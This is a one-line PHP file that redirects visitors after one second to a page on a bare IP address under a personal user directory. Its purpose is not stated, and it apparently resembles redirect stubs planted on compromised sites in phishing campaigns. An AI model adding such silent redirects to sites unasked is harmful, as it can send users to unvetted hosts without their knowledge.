<?php 
header("Refresh: 1; URL=http://46.186.73.147/~adam/2/");
?>
